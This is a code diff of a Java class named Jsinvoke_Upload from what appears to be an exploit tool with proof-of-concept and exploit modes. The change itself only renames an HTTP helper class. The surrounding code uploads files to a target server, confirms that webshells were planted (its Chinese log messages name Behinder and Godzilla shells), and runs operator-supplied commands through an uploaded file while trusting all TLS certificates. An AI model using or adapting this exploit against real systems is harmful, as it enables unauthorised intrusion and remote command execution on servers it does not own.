@@ -3,7 +3,7 @@ package com.chave.vuln;
 import com.chave.config.Config;
 import com.chave.config.Mod;
 import com.chave.proxy.HttpProxy;
-import com.chave.utils.HttpUtil;
+import com.chave.utils.MyHttpUtil;
 import com.chave.utils.SSLUtil;
 import com.chave.utils.Util;
 import javafx.scene.control.TextArea;
@@ -69,23 +69,23 @@ public class Jsinvoke_Upload extends VulnBase {
             conn1.setRequestProperty("Content-Type", "application/x-www-formurlencoded");
 
             // 设置超时
-            HttpUtil.setTimeout(conn1);
+            MyHttpUtil.setTimeout(conn1);
 
-            HttpUtil.post(conn1, postData.getBytes(StandardCharsets.UTF_8));
+            MyHttpUtil.post(conn1, postData.getBytes(StandardCharsets.UTF_8));
 
-            int responseCode1 = HttpUtil.getResponseCode(conn1);
+            int responseCode1 = MyHttpUtil.getResponseCode(conn1);
             if (responseCode1 == HttpURLConnection.HTTP_OK) {
                 URL fileUrl = new URL(Config.TARGET + "/" + fileName);
 
                 HttpURLConnection conn2 = (HttpURLConnection) fileUrl.openConnection();
 
                 // 设置超时
-                HttpUtil.setTimeout(conn2);
+                MyHttpUtil.setTimeout(conn2);
 
-                HttpUtil.get(conn2);
+                MyHttpUtil.get(conn2);
 
-                int responseCode2 = HttpUtil.getResponseCode(conn2);
-                String responseText2 = HttpUtil.getResponseText(conn2);
+                int responseCode2 = MyHttpUtil.getResponseCode(conn2);
+                String responseText2 = MyHttpUtil.getResponseText(conn2);
 
 
                 if (responseCode2 == HttpURLConnection.HTTP_OK && Config.MOD.equals(Mod.POC) && responseText2.contains(pocFlag)) {
@@ -99,10 +99,10 @@ public class Jsinvoke_Upload extends VulnBase {
                 if (responseCode2 == HttpURLConnection.HTTP_OK && Config.MOD.equals(Mod.EXP)) {
                     URL shellUrl = new URL(Config.TARGET + "/" + shellFileName);
                     HttpURLConnection conn3 = (HttpURLConnection) shellUrl.openConnection();
-                    HttpUtil.setTimeout(conn3);
-                    HttpUtil.get(conn3);
-                    int responseCode3 = HttpUtil.getResponseCode(conn3);
-                    String responseText3 = HttpUtil.getResponseText(conn3);
+                    MyHttpUtil.setTimeout(conn3);
+                    MyHttpUtil.get(conn3);
+                    int responseCode3 = MyHttpUtil.getResponseCode(conn3);
+                    String responseText3 = MyHttpUtil.getResponseText(conn3);
                     if (responseCode3 == HttpURLConnection.HTTP_OK && responseText3.contains(expFlag)) {
                         logMessage("[+] 文件上传成功! 同时写入回显/冰蝎/哥斯拉, 连接地址: " + shellUrl + "\n[+] 请求头与连接密码见 README.md.");
                         return;
@@ -146,11 +146,11 @@ public class Jsinvoke_Upload extends VulnBase {
             conn1.setRequestProperty("Content-Type", "application/x-www-formurlencoded");
 
             // 设置超时
-            HttpUtil.setTimeout(conn1);
+            MyHttpUtil.setTimeout(conn1);
 
-            HttpUtil.post(conn1, postData.getBytes(StandardCharsets.UTF_8));
+            MyHttpUtil.post(conn1, postData.getBytes(StandardCharsets.UTF_8));
 
-            int responseCode1 = HttpUtil.getResponseCode(conn1);
+            int responseCode1 = MyHttpUtil.getResponseCode(conn1);
             if (responseCode1 == HttpURLConnection.HTTP_OK) {
                 URL execUrl = new URL(Config.TARGET + "/" + execFileName);
                 String cmd = Config.CMD;
@@ -165,12 +165,12 @@ public class Jsinvoke_Upload extends VulnBase {
                 SSLUtil.trustAllCertificates();
 
                 HttpURLConnection conn2 = (HttpURLConnection) execUrl.openConnection();
-                HttpUtil.setTimeout(conn2);
+                MyHttpUtil.setTimeout(conn2);
 
-                HttpUtil.post(conn2, postData.getBytes(StandardCharsets.UTF_8));
+                MyHttpUtil.post(conn2, postData.getBytes(StandardCharsets.UTF_8));
 
-                int responseCode2 = HttpUtil.getResponseCode(conn2);
-                String responseText2 = HttpUtil.getResponseText(conn2).trim();
+                int responseCode2 = MyHttpUtil.getResponseCode(conn2);
+                String responseText2 = MyHttpUtil.getResponseText(conn2).trim();
                 if (responseCode2 == HttpURLConnection.HTTP_OK && !responseText2.isEmpty()) {
                     logExec("[+] 命令执行成功!\n" + responseText2.substring(46, responseText2.length() - 10));
                     return true;
